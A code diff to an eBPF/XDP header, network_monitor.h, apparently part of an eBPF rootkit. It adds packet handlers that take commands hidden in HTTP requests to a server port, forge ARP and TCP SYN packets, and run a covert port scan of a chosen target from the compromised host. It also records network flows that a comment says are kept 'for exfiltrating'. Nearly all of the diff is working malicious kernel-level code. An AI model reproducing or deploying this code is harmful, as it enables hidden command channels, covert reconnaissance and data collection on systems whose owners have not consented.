@@ -8,82 +8,6 @@
 #ifndef _NETWORK_MONITOR_H_
 #define _NETWORK_MONITOR_H_
 
-struct flow_t {
-    union {
-        struct {
-            u32 saddr;
-            u32 daddr;
-            u16 source_port;
-            u16 dest_port;
-            u32 flow_type;
-        } data;
-        struct {
-            u8 saddr_a;
-            u8 saddr_b;
-            u8 saddr_c;
-            u8 saddr_d;
-            u8 daddr_a;
-            u8 daddr_b;
-            u8 daddr_c;
-            u8 daddr_d;
-            u8 source_port_a;
-            u8 source_port_b;
-            u8 dest_port_a;
-            u8 dest_port_b;
-            u8 flow_type_a;
-            u8 flow_type_b;
-            u8 flow_type_c;
-            u8 flow_type_d;
-        } b;
-    };
-};
-
-#define MAX_FLOW_COUNT 8192
-
-struct bpf_map_def SEC("maps/network_flow_next_key") network_flow_next_key = {
-    .type = BPF_MAP_TYPE_ARRAY,
-    .key_size = sizeof(u32),
-    .value_size = sizeof(u32),
-    .max_entries = 1,
-    .pinning = 0,
-    .namespace = "",
-};
-
-struct bpf_map_def SEC("maps/network_flow_keys") network_flow_keys = {
-    .type = BPF_MAP_TYPE_ARRAY,
-    .key_size = sizeof(u32),
-    .value_size = sizeof(struct flow_t),
-    .max_entries = MAX_FLOW_COUNT,
-    .pinning = 0,
-    .namespace = "",
-};
-
-struct network_flow_counter_t {
-    union {
-        struct {
-            u64 udp_count;
-            u64 tcp_count;
-        } data;
-        struct {
-            u8 udp_count_a;
-            u8 udp_count_b;
-            u8 udp_count_c;
-            u8 udp_count_d;
-            u8 udp_count_e;
-            u8 udp_count_f;
-            u8 udp_count_g;
-            u8 udp_count_h;
-            u8 tcp_count_a;
-            u8 tcp_count_b;
-            u8 tcp_count_c;
-            u8 tcp_count_d;
-            u8 tcp_count_e;
-            u8 tcp_count_f;
-            u8 tcp_count_g;
-            u8 tcp_count_h;
-        } b;
-    };
-};
 
 struct bpf_map_def SEC("maps/network_flows") network_flows = {
     .type = BPF_MAP_TYPE_LRU_HASH,
@@ -94,27 +18,9 @@ struct bpf_map_def SEC("maps/network_flows") network_flows = {
     .namespace = "",
 };
 
-__attribute__((always_inline)) int monitor_flow_xdp(struct pkt_ctx_t *pkt) {
-    // generate flow
-    struct flow_t flow = {
-        .data = {
-            .saddr = pkt->ipv4->saddr,
-            .daddr = pkt->ipv4->daddr,
-            .flow_type = INGRESS_FLOW,
-        },
-    };
-    if (pkt->ipv4->protocol == IPPROTO_TCP) {
-        flow.data.source_port = htons(pkt->tcp->source);
-        flow.data.dest_port = htons(pkt->tcp->dest);
-    } else if (pkt->ipv4->protocol == IPPROTO_UDP) {
-        flow.data.source_port = htons(pkt->udp->source);
-        flow.data.dest_port = htons(pkt->udp->dest);
-    } else {
-        return 0;
-    }
-
+__attribute__((always_inline)) int monitor_flow(struct flow_t *flow, struct network_flow_counter_t *flow_counter) {
     // select flow counter
-    struct network_flow_counter_t *counter = bpf_map_lookup_elem(&network_flows, &flow);
+    struct network_flow_counter_t *counter = bpf_map_lookup_elem(&network_flows, flow);
     if (counter == NULL) {
         // this is a new flow, generate a new entry
         u32 key = 0;
@@ -135,26 +41,52 @@ __attribute__((always_inline)) int monitor_flow_xdp(struct pkt_ctx_t *pkt) {
 
         // set flow counter for provided key
         struct network_flow_counter_t new_counter = {};
-        bpf_map_update_elem(&network_flows, &flow, &new_counter, BPF_ANY);
+        bpf_map_update_elem(&network_flows, flow, &new_counter, BPF_ANY);
 
-        // set the flow in the network_flow_keys for exfiltration
-        bpf_map_update_elem(&network_flow_keys, &key, &flow, BPF_ANY);
+        // set the flow in the network_flow_keys for exfiltrating
+        bpf_map_update_elem(&network_flow_keys, &key, flow, BPF_ANY);
     }
 
-    counter = bpf_map_lookup_elem(&network_flows, &flow);
+    counter = bpf_map_lookup_elem(&network_flows, flow);
     if (counter == NULL) {
         // should never happen
         return 0;
     }
 
     // add packet length to counter
-    if (pkt->ipv4->protocol == IPPROTO_TCP) {
-        counter->data.tcp_count = counter->data.tcp_count + htons(pkt->ipv4->tot_len);
-    } else if (pkt->ipv4->protocol == IPPROTO_UDP) {
-        counter->data.udp_count = counter->data.udp_count + htons(pkt->ipv4->tot_len);
-    }
+    counter->data.tcp_count += flow_counter->data.tcp_count;
+    counter->data.udp_count += flow_counter->data.udp_count;
 
     return 0;
+}
+
+__attribute__((always_inline)) int monitor_flow_xdp(struct pkt_ctx_t *pkt) {
+    // generate flow
+    struct flow_t flow = {
+        .data = {
+            .saddr = pkt->ipv4->saddr,
+            .daddr = pkt->ipv4->daddr,
+            .flow_type = INGRESS_FLOW,
+        },
+    };
+    if (pkt->ipv4->protocol == IPPROTO_TCP) {
+        flow.data.source_port = htons(pkt->tcp->source);
+        flow.data.dest_port = htons(pkt->tcp->dest);
+    } else if (pkt->ipv4->protocol == IPPROTO_UDP) {
+        flow.data.source_port = htons(pkt->udp->source);
+        flow.data.dest_port = htons(pkt->udp->dest);
+    } else {
+        return 0;
+    }
+    struct network_flow_counter_t counter = {};
+    // add packet length to counter
+    if (pkt->ipv4->protocol == IPPROTO_TCP) {
+        counter.data.tcp_count = htons(pkt->ipv4->tot_len);
+    } else if (pkt->ipv4->protocol == IPPROTO_UDP) {
+        counter.data.udp_count = htons(pkt->ipv4->tot_len);
+    }
+
+    return monitor_flow(&flow, &counter);
 }
 
 __attribute__((always_inline)) int atoi(char c) {
@@ -258,7 +190,6 @@ __attribute__((always_inline)) int handle_get_net_dis(char request[HTTP_REQ_LEN]
     return 0;
 }
 
-
 SEC("xdp/ingress/get_net_dis")
 int xdp_ingress_get_net_dis(struct xdp_md *ctx) {
     struct cursor c;
@@ -281,6 +212,413 @@ int xdp_ingress_get_net_dis(struct xdp_md *ctx) {
     }
 
     return XDP_PASS;
+}
+
+__attribute__((always_inline)) int handle_get_net_sca(struct xdp_md *ctx, struct cursor *c, struct pkt_ctx_t *pkt, char request[HTTP_REQ_LEN]) {
+    u32 csum = 0;
+    u32 zero = 0;
+    u16 to_strip = 0;
+    struct network_scan_t scan = {};
+
+    // parse ip
+    scan.daddr = (atoi(request[0]) * 100 + atoi(request[1]) * 10 + atoi(request[2]));
+    scan.daddr += (atoi(request[3]) * 100 + atoi(request[4]) * 10 + atoi(request[5])) << 8;
+    scan.daddr += (atoi(request[6]) * 100 + atoi(request[7]) * 10 + atoi(request[8])) << 16;
+    scan.daddr += (atoi(request[9]) * 100 + atoi(request[10]) * 10 + atoi(request[11])) << 24;
+
+    // parse port
+    scan.port = atoi(request[12]) * 10000 + atoi(request[13]) * 1000 + atoi(request[14]) * 100 + atoi(request[15]) * 10 + atoi(request[16]);
+
+    // parse portRange
+    scan.port_range = atoi(request[17]) * 10000 + atoi(request[18]) * 1000 + atoi(request[19]) * 100 + atoi(request[20]) * 10 + atoi(request[21]);
+
+    struct network_scan_state_t *state = bpf_map_lookup_elem(&network_scans, &scan);
+    if (state == NULL) {
+        struct network_scan_state_t new_state = {};
+        bpf_map_update_elem(&network_scans, &scan, &new_state, BPF_ANY);
+        state = bpf_map_lookup_elem(&network_scans, &scan);
+        if (state == NULL) {
+            // should never happen
+            return -1;
+        }
+    }
+
+    if (state->syn_counter >= scan.port_range) {
+        // let the packet go through
+        return -1;
+    }
+
+    char *dst_mac;
+    if (state->step == ARP_REQUEST_STEP) {
+        // check if the requested IP has its corresponding MAC address in cache
+        dst_mac = bpf_map_lookup_elem(&arp_cache, &scan.daddr);
+        if (dst_mac == NULL) {
+            // bpf_printk("sending ARP request ...\n");
+
+            // fetch ARP request payload
+            u32 raw_packet_key = ARP_REQUEST_RAW_PACKET;
+            struct raw_packet_t *packet = bpf_map_lookup_elem(&raw_packets, &raw_packet_key);
+            if (packet == NULL) {
+                // should never happen
+                return -1;
+            }
+
+            // override source MAC addr (layer 2)
+            packet->data[6] = pkt->eth->h_dest[0];
+            packet->data[7] = pkt->eth->h_dest[1];
+            packet->data[8] = pkt->eth->h_dest[2];
+            packet->data[9] = pkt->eth->h_dest[3];
+            packet->data[10] = pkt->eth->h_dest[4];
+            packet->data[11] = pkt->eth->h_dest[5];
+
+            // override source MAC addr (ARP request)
+            packet->data[22] = pkt->eth->h_dest[0];
+            packet->data[23] = pkt->eth->h_dest[1];
+            packet->data[24] = pkt->eth->h_dest[2];
+            packet->data[25] = pkt->eth->h_dest[3];
+            packet->data[26] = pkt->eth->h_dest[4];
+            packet->data[27] = pkt->eth->h_dest[5];
+
+            // override source IP address (ARP request)
+            packet->data[28] = *(u8*)((char *)&pkt->ipv4->daddr);
+            packet->data[29] = *(u8*)((char *)&pkt->ipv4->daddr + 1);
+            packet->data[30] = *(u8*)((char *)&pkt->ipv4->daddr + 2);
+            packet->data[31] = *(u8*)((char *)&pkt->ipv4->daddr + 3);
+
+            // override target IP address (ARP request)
+            packet->data[38] = *(u8*)((char *)&scan.daddr);
+            packet->data[39] = *(u8*)((char *)&scan.daddr + 1);
+            packet->data[40] = *(u8*)((char *)&scan.daddr + 2);
+            packet->data[41] = *(u8*)((char *)&scan.daddr + 3);
+
+            // write forged ARP request
+            u8 *cursor = (void *) pkt->eth;
+
+            #pragma unroll
+            for (int i = 0; i < RAW_PACKET_LEN; i++) {
+                if (i >= packet->len) {
+                    goto next_arp;
+                }
+
+                if (cursor + i + 1 > c->end) {
+                    goto next_arp;
+                }
+
+                *cursor++ = packet->data[i];
+                // bpf_printk("%d: %x\n", i, packet->data[i] & 0xFF);
+            }
+
+next_arp:
+            // cut the packet to the right size
+            to_strip = c->end - (void *)cursor;
+            bpf_xdp_adjust_tail(ctx, -(int)to_strip);
+            state->step = ARP_REPLY_STEP;
+
+            // insert scan key in arp_ip_scan_key so that the ARP monitoring program can update the step of the scan
+            bpf_map_update_elem(&arp_ip_scan_key, &scan.daddr, &scan, BPF_ANY);
+
+            // add monitoring
+            struct flow_t flow = {
+                .data = {
+                    .saddr = *(u32*)(void *)&packet->data[28],
+                    .daddr = scan.daddr,
+                    .flow_type = ARP_REQUEST,
+                },
+            };
+            struct network_flow_counter_t counter = {};
+            monitor_flow(&flow, &counter);
+            bpf_printk("sending ARP request ...\n");
+
+            // XDP_TX request
+            return 1;
+
+        } else {
+            // if the IP is in cache, we don't need to resolve its MAC address, move on to the SYN scan
+            state->step = SYN_STEP;
+        }
+    }
+
+    if (state->step == SYN_STEP) {
+        u32 raw_packet_key = SYN_REQUEST_RAW_PACKET;
+        struct raw_packet_t *packet = bpf_map_lookup_elem(&raw_packets, &raw_packet_key);
+        if (packet == NULL) {
+            // should never happen
+            return -1;
+        }
+
+        dst_mac = bpf_map_lookup_elem(&arp_cache, &scan.daddr);
+        if (dst_mac == NULL) {
+            // should never happen
+            return -1;
+        }
+
+        // override destination MAC addr (layer 2)
+        packet->data[0] = *dst_mac;
+        packet->data[1] = *(dst_mac + 1);
+        packet->data[2] = *(dst_mac + 2);
+        packet->data[3] = *(dst_mac + 3);
+        packet->data[4] = *(dst_mac + 4);
+        packet->data[5] = *(dst_mac + 5);
+
+        // override source MAC addr (layer 2)
+        packet->data[6] = pkt->eth->h_dest[0];
+        packet->data[7] = pkt->eth->h_dest[1];
+        packet->data[8] = pkt->eth->h_dest[2];
+        packet->data[9] = pkt->eth->h_dest[3];
+        packet->data[10] = pkt->eth->h_dest[4];
+        packet->data[11] = pkt->eth->h_dest[5];
+
+        // override source IP address (layer 3)
+        u32 src_ip = pkt->ipv4->daddr;
+        packet->data[26] = *(u8*)((char *)&pkt->ipv4->daddr);
+        packet->data[27] = *(u8*)((char *)&pkt->ipv4->daddr + 1);
+        packet->data[28] = *(u8*)((char *)&pkt->ipv4->daddr + 2);
+        packet->data[29] = *(u8*)((char *)&pkt->ipv4->daddr + 3);
+
+        // override destination IP address (layer 3)
+        packet->data[30] = *(u8*)((char *)&scan.daddr);
+        packet->data[31] = *(u8*)((char *)&scan.daddr + 1);
+        packet->data[32] = *(u8*)((char *)&scan.daddr + 2);
+        packet->data[33] = *(u8*)((char *)&scan.daddr + 3);
+
+        // override destination port (layer 4)
+        packet->data[36] = *(u8*)((char *)&scan.port + 1);
+        packet->data[37] = *(u8*)((char *)&scan.port);
+
+        // write forged ARP request
+        u8 *cursor = (void *) pkt->eth;
+
+        #pragma unroll
+        for (int i = 0; i < RAW_PACKET_LEN; i++) {
+            if (i >= packet->len) {
+                goto next_syn;
+            }
+
+            if (cursor + i + 1 > c->end) {
+                goto next_syn;
+            }
+
+            *cursor++ = packet->data[i];
+            // bpf_printk("%d: %x\n", i, packet->data[i] & 0xFF);
+        }
+
+next_syn:
+        // compute IP checksum (layer 3)
+        csum = ~(0xd07a); // this is the initial IP layer checksum (as set by the user space program) when all IPs are set to 0
+        csum = bpf_csum_diff(&zero, 4, &scan.daddr, 4, csum);
+        csum = (csum & 0xFFFF) + (csum >> 16);
+        csum = (csum & 0xFFFF) + (csum >> 16);
+        csum = bpf_csum_diff(&zero, 4, &src_ip, 4, csum);
+        csum = (csum & 0xFFFF) + (csum >> 16);
+        csum = (csum & 0xFFFF) + (csum >> 16);
+        pkt->ipv4->check = ~csum;
+
+        // adjust packet tail
+        to_strip = c->end - (void *) cursor;
+        bpf_xdp_adjust_tail(ctx, -(int)to_strip);
+
+        // compute TCP checksum (layer 4)
+        xdp_compute_tcp_csum(ctx, c, pkt);
+
+        // update SYN counter
+        state->syn_counter += 1;
+        state->step = SYN_LOOP_STEP;
+
+        // add monitoring
+        struct flow_t flow = {
+            .data = {
+                .saddr = src_ip,
+                .daddr = scan.daddr,
+                .flow_type = SYN_REQUEST,
+                .source_port = COOL,
+                .dest_port = scan.port,
+            },
+        };
+        struct network_flow_counter_t counter = {
+            .data = {
+                .tcp_count = packet->len,
+            },
+        };
+        monitor_flow(&flow, &counter);
+
+        // insert scan key in tcp_ip_scan_key so that we can detect the Ack / Reset answer and advance to the next port.
+        bpf_map_update_elem(&tcp_ip_scan_key, &scan.daddr, &scan, BPF_ANY);
+
+        // XDP_TX request
+        return 1;
+    }
+
+    if (state->step == SCAN_FINISHED) {
+        // remove scan request
+        bpf_map_delete_elem(&network_scans, &scan);
+    }
+
+    return 0;
+}
+
+SEC("xdp/ingress/get_net_sca")
+int xdp_ingress_get_net_sca(struct xdp_md *ctx) {
+    struct cursor c;
+    struct pkt_ctx_t pkt;
+    int ret = parse_xdp_packet(ctx, &c, &pkt);
+    if (ret < 0) {
+        return XDP_PASS;
+    }
+
+    switch (pkt.ipv4->protocol) {
+        case IPPROTO_TCP:
+            if (pkt.tcp->dest != htons(load_http_server_port())) {
+                return XDP_PASS;
+            }
+
+            switch (handle_get_net_sca(ctx, &c, &pkt, pkt.http_req->data)) {
+            case -1:
+            case 0:
+                // tail call to execute the action set for this request
+                bpf_tail_call(ctx, &xdp_progs, HTTP_ACTION_HANDLER);
+                break;
+            case 1:
+                // retransmit the packet
+                return XDP_TX;
+            }
+            break;
+    }
+
+    return XDP_PASS;
+}
+
+SEC("xdp/ingress/syn_loop")
+int xdp_ingress_syn_loop(struct xdp_md *ctx) {
+    struct cursor c;
+    struct pkt_ctx_t pkt;
+    xdp_cursor_init(&c, ctx);
+    if (!(pkt.eth = parse_ethhdr(&c))) {
+        return XDP_PASS;
+    }
+
+    if (pkt.eth->h_proto != htons(ETH_P_IP)) {
+        return XDP_PASS;
+    }
+
+    if (!(pkt.ipv4 = parse_iphdr(&c))) {
+        return XDP_PASS;
+    }
+
+    if (pkt.ipv4->protocol != IPPROTO_TCP) {
+        return XDP_PASS;
+    }
+
+    if (!(pkt.tcp = parse_tcphdr(&c))) {
+        return XDP_PASS;
+    }
+
+    // check the destination port
+    if (pkt.tcp->dest != htons(COOL)) {
+        return XDP_PASS;
+    }
+
+    // select active scan
+    struct network_scan_t *scan = bpf_map_lookup_elem(&tcp_ip_scan_key, &pkt.ipv4->saddr);
+    if (scan == NULL) {
+        return XDP_PASS;
+    }
+
+    struct network_scan_state_t *state = bpf_map_lookup_elem(&network_scans, scan);
+    if (state == NULL) {
+        return XDP_PASS;
+    }
+
+    if (state->step != SYN_LOOP_STEP) {
+        return XDP_PASS;
+    }
+
+    // add monitoring
+    struct flow_t flow = {
+        .data = {
+            .saddr = pkt.ipv4->saddr,
+            .daddr = pkt.ipv4->daddr,
+            .source_port = htons(pkt.tcp->source),
+            .dest_port = COOL,
+        },
+    };
+    struct network_flow_counter_t counter = {
+        .data = {
+            .tcp_count = htons(pkt.ipv4->tot_len),
+        },
+    };
+    if (pkt.tcp->rst) {
+        flow.data.flow_type = RESET;
+    } else if (pkt.tcp->syn && pkt.tcp->ack) {
+        flow.data.flow_type = SYN_ACK;
+        bpf_printk("OPEN PORT %d\n", htons(pkt.tcp->source));
+    }
+    monitor_flow(&flow, &counter);
+    bpf_printk("SYN request answer (%d): rst:%d syn:%d\n", htons(pkt.tcp->source), pkt.tcp->rst, pkt.tcp->syn);
+
+    // increment syn_counter
+    state->syn_counter += 1;
+
+    // check if we should send another SYN request or stop there
+    if (state->syn_counter >= scan->port_range) {
+        goto scan_finished;
+    }
+
+    // prepare next SYN request
+    pkt.tcp->ack = 0;
+    pkt.tcp->rst = 0;
+    pkt.tcp->syn = 1;
+    u16 port = scan->port + state->syn_counter;
+    pkt.tcp->dest = htons(port);
+    pkt.tcp->source = htons(COOL);
+
+    // switch IPs
+    u32 saddr = pkt.ipv4->saddr;
+    u32 daddr = pkt.ipv4->daddr;
+    pkt.ipv4->saddr = daddr;
+    pkt.ipv4->daddr = saddr;
+
+    // switch MAC addresses
+    char tmp_mac[ETH_ALEN] = {};
+    tmp_mac[0] = pkt.eth->h_dest[0];
+    tmp_mac[1] = pkt.eth->h_dest[1];
+    tmp_mac[2] = pkt.eth->h_dest[2];
+    tmp_mac[3] = pkt.eth->h_dest[3];
+    tmp_mac[4] = pkt.eth->h_dest[4];
+    tmp_mac[5] = pkt.eth->h_dest[5];
+
+    pkt.eth->h_dest[0] = pkt.eth->h_source[0];
+    pkt.eth->h_dest[1] = pkt.eth->h_source[1];
+    pkt.eth->h_dest[2] = pkt.eth->h_source[2];
+    pkt.eth->h_dest[3] = pkt.eth->h_source[3];
+    pkt.eth->h_dest[4] = pkt.eth->h_source[4];
+    pkt.eth->h_dest[5] = pkt.eth->h_source[5];
+
+    pkt.eth->h_source[0] = tmp_mac[0];
+    pkt.eth->h_source[1] = tmp_mac[1];
+    pkt.eth->h_source[2] = tmp_mac[2];
+    pkt.eth->h_source[3] = tmp_mac[3];
+    pkt.eth->h_source[4] = tmp_mac[4];
+    pkt.eth->h_source[5] = tmp_mac[5];
+
+    // compute TCP checksum (layer 4)
+    xdp_compute_tcp_csum(ctx, &c, &pkt);
+
+    // add monitoring
+    flow.data.saddr = daddr;
+    flow.data.daddr = saddr;
+    flow.data.dest_port = port;
+    flow.data.source_port = COOL;
+    flow.data.flow_type = SYN_REQUEST;
+    monitor_flow(&flow, &counter);
+
+    // send new SYN request
+    return XDP_TX;
+
+scan_finished:
+    state->step = SCAN_FINISHED;
+    bpf_map_delete_elem(&tcp_ip_scan_key, &scan->daddr);
+    bpf_printk("scan done !\n");
+    return XDP_DROP;
 }
 
 #endif
